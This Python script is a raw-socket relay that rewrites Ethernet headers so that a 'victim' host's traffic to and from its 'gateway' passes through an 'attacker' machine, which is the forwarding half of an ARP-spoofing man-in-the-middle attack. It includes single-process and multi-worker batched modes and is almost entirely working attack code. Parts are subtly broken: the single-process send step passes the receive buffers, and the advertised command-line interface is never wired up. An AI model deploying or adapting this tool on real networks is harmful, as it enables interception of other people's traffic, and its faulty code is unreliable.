#!/usr/bin/env python3
# fast_l2_redirect_main_signature.py
# Preserves original main(IFACE, VICTIM, GATEWAY, workers, batched)
# Behavior:
#  - If workers <= 1: run single-process forwarding loop (very close to original logic)
#  - If workers > 1: run a dispatcher (batched recvmmsg) and worker processes.
# No puller.settings used; workers and batched are explicit main args.
#
# Run as root.
# Example:
#  sudo python3 fast_l2_redirect_main_signature.py -i eth0 -v 192.168.1.5 -g 192.168.1.1 -w 4 -b 8

import os
import sys
import socket
import struct
import argparse
import ctypes
import ctypes.util
import multiprocessing as mp
from fcntl import ioctl
import subprocess
import time

# --- constants (kept from original script) ---
ETH_P_ALL = 0x0003
SIOCGIFHWADDR = 0x8927
SIOCGIFINDEX  = 0x8933
SIOCGIFMTU    = 0x8921
MAX_FRAME = 65536

# --- helpers (preserved) ---
def if_hwaddr(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        req = struct.pack('256s', ifname[:15].encode())
        info = ioctl(s.fileno(), SIOCGIFHWADDR, req)
        return info[18:24]
    finally:
        if ioctl_sock is None:
            s.close()

def if_index(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack('256s', ifname[:15].encode())
        res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
        return struct.unpack('i', res[16:20])[0]
    finally:
        if ioctl_sock is None:
            s.close()

def if_mtu(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack('256s', ifname[:15].encode())
        res = ioctl(s.fileno(), SIOCGIFMTU, ifreq)
        return struct.unpack('i', res[16:20])[0]
    except Exception:
        return None
    finally:
        if ioctl_sock is None:
            s.close()

def resolve_mac_ip(iface, ip):
    try:
        out = subprocess.check_output(["ip", "neigh", "show", "to", ip], stderr=subprocess.DEVNULL)
        text = out.decode(errors="ignore")
    except Exception:
        return None
    for token in text.split():
        if token.count(':') == 5:
            try:
                return bytes(int(b, 16) for b in token.split(':'))
            except Exception:
                continue
    return None

def mac_to_int(b):
    return int.from_bytes(b, "big")

def mac_str(b):
    return ':'.join(f"{x:02x}" for x in b)

# --- optional libc recvmmsg/sendmmsg wiring ---
_libc = None
def init_libc():
    global _libc
    if _libc is not None:
        return True
    libc_path = ctypes.util.find_library("c")
    if not libc_path:
        return False
    try:
        _libc = ctypes.CDLL(libc_path, use_errno=True)
    except Exception:
        _libc = None
        return False

    class IOVec(ctypes.Structure):
        _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
    class MsgHdr(ctypes.Structure):
        _fields_ = [
            ("msg_name", ctypes.c_void_p),
            ("msg_namelen", ctypes.c_uint32),
            ("msg_iov", ctypes.POINTER(IOVec)),
            ("msg_iovlen", ctypes.c_size_t),
            ("msg_control", ctypes.c_void_p),
            ("msg_controllen", ctypes.c_size_t),
            ("msg_flags", ctypes.c_int)
        ]
    class MMsgHdr(ctypes.Structure):
        _fields_ = [("msg_hdr", MsgHdr), ("msg_len", ctypes.c_uint32)]

    _libc.IOVec = IOVec
    _libc.MsgHdr = MsgHdr
    _libc.MMsgHdr = MMsgHdr

    try:
        _libc.recvmmsg.argtypes = [ctypes.c_int, ctypes.POINTER(MMsgHdr), ctypes.c_uint, ctypes.c_int, ctypes.c_void_p]
        _libc.recvmmsg.restype = ctypes.c_int
        _libc.sendmmsg.argtypes = [ctypes.c_int, ctypes.POINTER(MMsgHdr), ctypes.c_uint, ctypes.c_int]
        _libc.sendmmsg.restype = ctypes.c_int
        return True
    except Exception:
        _libc = None
        return False

# --- single-process forwarding (original-style) ---
def single_process_forward(IFACE, attacker_mac, victim_mac, gateway_mac, mtu, batch_size):
    use_libc = init_libc()
    if use_libc:
        IOVec = _libc.IOVec
        MMsgHdr = _libc.MMsgHdr

    allowed_frame_max = (mtu + 14) if mtu else 1514
    a_mac = attacker_mac
    v_mac = victim_mac
    g_mac = gateway_mac
    a_int = mac_to_int(a_mac)

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4*1024*1024)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
    s.bind((IFACE, 0))
    fd = s.fileno()

    recv_bufs = [bytearray(MAX_FRAME) for _ in range(batch_size)]
    recv_mvs = [memoryview(b) for b in recv_bufs]
    send_bufs = [bytearray(MAX_FRAME) for _ in range(batch_size)]
    send_mvs = [memoryview(b) for b in send_bufs]

    tmpl_to_gw = bytearray(14)
    tmpl_to_gw[0:6] = g_mac
    tmpl_to_gw[6:12] = a_mac
    tmpl_to_vic = bytearray(14)
    tmpl_to_vic[0:6] = v_mac
    tmpl_to_vic[6:12] = a_mac

    oversized_logged = False

    if use_libc:
        # set up iov/mmsg for recvmmsg
        iovecs = (_libc.IOVec * batch_size)()
        mmsgs = (_libc.MMsgHdr * batch_size)()
        for i in range(batch_size):
            buf_ct = (ctypes.c_char * MAX_FRAME).from_buffer(recv_bufs[i])
            iovecs[i].iov_base = ctypes.cast(buf_ct, ctypes.c_void_p)
            iovecs[i].iov_len = ctypes.c_size_t(MAX_FRAME)
            mmsgs[i].msg_hdr.msg_name = None
            mmsgs[i].msg_hdr.msg_namelen = 0
            mmsgs[i].msg_hdr.msg_iov = ctypes.pointer(iovecs[i])
            mmsgs[i].msg_hdr.msg_iovlen = 1
            mmsgs[i].msg_hdr.msg_control = None
            mmsgs[i].msg_hdr.msg_controllen = 0
            mmsgs[i].msg_hdr.msg_flags = 0
            mmsgs[i].msg_len = 0
        batch_ptr = ctypes.cast(mmsgs, ctypes.POINTER(_libc.MMsgHdr))

        while True:
            n = _libc.recvmmsg(fd, batch_ptr, batch_size, 0, None)
            if n <= 0:
                continue
            send_iovs = []
            send_counts = 0
            for i in range(n):
                rlen = mmsgs[i].msg_len
                if rlen <= 14:
                    continue
                buf = recv_bufs[i]
                src = bytes(buf[6:12])
                if mac_to_int(src) == a_int:
                    continue
                if bytes(src) == bytes(v_mac):
                    dst_template = tmpl_to_gw
                elif bytes(src) == bytes(g_mac):
                    dst_template = tmpl_to_vic
                else:
                    continue
                send_len = rlen if rlen <= allowed_frame_max else allowed_frame_max
                if send_len < rlen and not oversized_logged:
                    oversized_logged = True
                    sys.stderr.write(f"warning: frame {rlen} > allowed {allowed_frame_max}; truncating.\n")
                # prepare send buffer in-place
                sb = send_mvs[send_counts]
                sb[0:12] = dst_template[0:12]
                sb[12:send_len] = buf[12:send_len]
                send_iovs.append(sb[:send_len])
                send_counts += 1
            if send_counts:
                try:
                    _libc.sendmmsg(fd, batch_ptr, send_counts, 0)
                except Exception:
                    # fallback per-frame
                    for b in send_iovs:
                        try:
                            s.send(bytes(b))
                        except Exception:
                            try:
                                s.sendto(bytes(b), (IFACE,0))
                            except Exception:
                                pass
    else:
        # fallback path using recvmsg_into / sendmsg
        while True:
            nbytes, ancdata, flags, addr = s.recvmsg_into([recv_mvs[0]], 0)
            if nbytes <= 14:
                continue
            frame = recv_mvs[0][:nbytes]
            src = bytes(frame[6:12])
            if mac_to_int(src) == a_int:
                continue
            if src == v_mac:
                dst_template = tmpl_to_gw
            elif src == g_mac:
                dst_template = tmpl_to_vic
            else:
                continue
            send_len = min(nbytes, allowed_frame_max)
            if send_len < nbytes and not oversized_logged:
                oversized_logged = True
                sys.stderr.write(f"warning: frame {nbytes} > allowed {allowed_frame_max}; truncating.\n")
            send_buf = bytearray(send_len)
            send_buf[0:12] = dst_template[0:12]
            send_buf[12:send_len] = frame[12:send_len]
            try:
                s.sendmsg([send_buf])
            except Exception:
                try:
                    s.send(bytes(send_buf))
                except Exception:
                    s.sendto(bytes(send_buf), (IFACE,0))

# --- worker used in multiprocess mode ---
def worker_process(iface, attacker_mac_bytes, victim_mac_bytes, gateway_mac_bytes, mtu, in_queue, batch_size):
    """
    Worker receives frame bytes (immutable bytes objects) from the dispatcher queue,
    rewrites L2 header and batches sendmmsg when libc available.
    Note: this implementation copies frames from dispatcher; buffer ownership model
    could be optimized to avoid copies (more complexity).
    """
    use_libc = init_libc()
    allowed_frame_max = (mtu + 14) if mtu else 1514
    a_int = mac_to_int(attacker_mac_bytes)
    v_int = mac_to_int(victim_mac_bytes)
    g_int = mac_to_int(gateway_mac_bytes)

    tmpl_to_gw = bytearray(14)
    tmpl_to_gw[0:6] = gateway_mac_bytes
    tmpl_to_gw[6:12] = attacker_mac_bytes
    tmpl_to_vic = bytearray(14)
    tmpl_to_vic[0:6] = victim_mac_bytes
    tmpl_to_vic[6:12] = attacker_mac_bytes

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
    s.bind((iface, 0))
    fd = s.fileno()

    if use_libc:
        IOVec = _libc.IOVec
        MMsgHdr = _libc.MMsgHdr
        iovecs = (IOVec * batch_size)()
        mmsgs = (MMsgHdr * batch_size)()

    local_send = s.send
    while True:
        batch = []
        try:
            first = in_queue.get()  # block for at least one
            batch.append(first)
            # try to collect more without blocking
            for _ in range(batch_size - 1):
                try:
                    batch.append(in_queue.get_nowait())
                except Exception:
                    break
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(0.001)
            continue

        if use_libc:
            out_i = 0
            # prepare mmsgs
            refs = []
            for frame in batch:
                if len(frame) <= 14:
                    continue
                src_int = mac_to_int(frame[6:12])
                if src_int == a_int:
                    continue
                if src_int == v_int:
                    header = tmpl_to_gw
                elif src_int == g_int:
                    header = tmpl_to_vic
                else:
                    continue
                send_len = min(len(frame), allowed_frame_max)
                outb = bytearray(send_len)
                outb[0:12] = header[0:12]
                outb[12:send_len] = frame[12:send_len]
                # create ctypes buffer from outb
                buf_ct = (ctypes.c_char * len(outb)).from_buffer(outb)
                iovecs[out_i].iov_base = ctypes.cast(buf_ct, ctypes.c_void_p)
                iovecs[out_i].iov_len = ctypes.c_size_t(len(outb))
                mmsgs[out_i].msg_hdr.msg_name = None
                mmsgs[out_i].msg_hdr.msg_namelen = 0
                mmsgs[out_i].msg_hdr.msg_iov = ctypes.pointer(iovecs[out_i])
                mmsgs[out_i].msg_hdr.msg_iovlen = 1
                mmsgs[out_i].msg_hdr.msg_control = None
                mmsgs[out_i].msg_hdr.msg_controllen = 0
                mmsgs[out_i].msg_hdr.msg_flags = 0
                mmsgs[out_i].msg_len = len(outb)
                # keep reference to avoid GC
                refs.append(outb)
                out_i += 1
                if out_i >= batch_size:
                    break
            if out_i:
                try:
                    _libc.sendmmsg(fd, ctypes.cast(mmsgs, ctypes.POINTER(_libc.MMsgHdr)), out_i, 0)
                except Exception:
                    for ob in refs:
                        try:
                            local_send(bytes(ob))
                        except Exception:
                            pass
        else:
            for frame in batch:
                if len(frame) <= 14:
                    continue
                src_int = mac_to_int(frame[6:12])
                if src_int == a_int:
                    continue
                if src_int == v_int:
                    header = tmpl_to_gw
                elif src_int == g_int:
                    header = tmpl_to_vic
                else:
                    continue
                send_len = min(len(frame), allowed_frame_max)
                outb = bytearray(send_len)
                outb[0:12] = header[0:12]
                outb[12:send_len] = frame[12:send_len]
                try:
                    local_send(bytes(outb))
                except Exception:
                    pass

# --- dispatcher (single socket, batched recvmmsg) when workers>1 ---
def dispatcher_loop(IFACE, attacker_mac_bytes, victim_mac_bytes, gateway_mac_bytes, mtu, workers, batch_size):
    """
    Dispatcher receives batches (recvmmsg when available) and enqueues frame bytes
    to worker queues. This implementation copies frames into bytes objects when
    placing them on per-worker queues (simple portability).
    """
    use_libc = init_libc()

    # create worker queues and processes
    queues = [mp.Queue(maxsize=1024) for _ in range(workers)]
    procs = []
    for i in range(workers):
        p = mp.Process(target=worker_process, args=(IFACE, attacker_mac_bytes, victim_mac_bytes, gateway_mac_bytes, mtu, queues[i], batch_size))
        p.daemon = True
        p.start()
        procs.append(p)

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4*1024*1024)
    s.bind((IFACE, 0))
    fd = s.fileno()

    if use_libc:
        iovecs = (_libc.IOVec * batch_size)()
        mmsgs = (_libc.MMsgHdr * batch_size)()
        recv_bufs = [bytearray(MAX_FRAME) for _ in range(batch_size)]
        for i in range(batch_size):
            buf_ct = (ctypes.c_char * MAX_FRAME).from_buffer(recv_bufs[i])
            iovecs[i].iov_base = ctypes.cast(buf_ct, ctypes.c_void_p)
            iovecs[i].iov_len = ctypes.c_size_t(MAX_FRAME)
            mmsgs[i].msg_hdr.msg_name = None
            mmsgs[i].msg_hdr.msg_namelen = 0
            mmsgs[i].msg_hdr.msg_iov = ctypes.pointer(iovecs[i])
            mmsgs[i].msg_hdr.msg_iovlen = 1
            mmsgs[i].msg_hdr.msg_control = None
            mmsgs[i].msg_hdr.msg_controllen = 0
            mmsgs[i].msg_hdr.msg_flags = 0
            mmsgs[i].msg_len = 0
        batch_ptr = ctypes.cast(mmsgs, ctypes.POINTER(_libc.MMsgHdr))

        while True:
            n = _libc.recvmmsg(fd, batch_ptr, batch_size, 0, None)
            if n <= 0:
                continue
            # dispatch each received frame to a worker by hashing src MAC
            for i in range(n):
                rlen = mmsgs[i].msg_len
                if rlen <= 14:
                    continue
                buf = recv_bufs[i]
                src = bytes(buf[6:12])
                # simple hash to pick worker
                idx = (int.from_bytes(src, "big")) % workers
                # copy exact-length bytes to put on queue
                frame_bytes = bytes(buf[:rlen])
                # block if queue full (backpressure)
                queues[idx].put(frame_bytes)
    else:
        # fallback single recv mode for portability
        recv_buf = bytearray(MAX_FRAME)
        mv = memoryview(recv_buf)
        while True:
            try:
                nbytes, anc, flags, addr = s.recvmsg_into([mv], 0)
            except Exception:
                continue
            if nbytes <= 14:
                continue
            src = bytes(recv_buf[6:12])
            idx = (int.from_bytes(src, "big")) % workers
            queues[idx].put(bytes(recv_buf[:nbytes]))

# --- main signature preserved and accepts workers & batched explicitly ---
def main(IFACE, VICTIM, GATEWAY, workers=2, batched=12):
    if os.geteuid() != 0:
        print("run as root", file=sys.stderr)
        sys.exit(1)

    victim_mac = resolve_mac_ip(IFACE, VICTIM)
    gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
    if not victim_mac or not gateway_mac:
        print("couldn't resolve macs (try `ip neigh` to populate arp)", file=sys.stderr)
        sys.exit(1)

    ioctl_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        attacker_mac = if_hwaddr(IFACE, ioctl_sock)
        ifindex = if_index(IFACE, ioctl_sock)
        mtu = if_mtu(IFACE, ioctl_sock)
    finally:
        ioctl_sock.close()

    allowed_frame_max = (mtu + 14) if mtu else 1514

    print("attacker mac:", mac_str(attacker_mac))
    print("victim mac:", mac_str(victim_mac))
    print("gateway mac:", mac_str(gateway_mac))
    print("iface mtu:", mtu, "allowed_frame_max:", allowed_frame_max)
    print(f"workers={workers} batch_size={batched}")

    if workers <= 1:
        # single-process path (closest to your original main loop)
        single_process_forward(IFACE, attacker_mac, victim_mac, gateway_mac, mtu, batched)
    else:
        # dispatcher + worker processes
        try:
            dispatcher_loop(IFACE, attacker_mac, victim_mac, gateway_mac, mtu, workers, batched)
        except KeyboardInterrupt:
            print("stopping dispatcher/workers...")
            # processes are daemon; let them terminate with parent
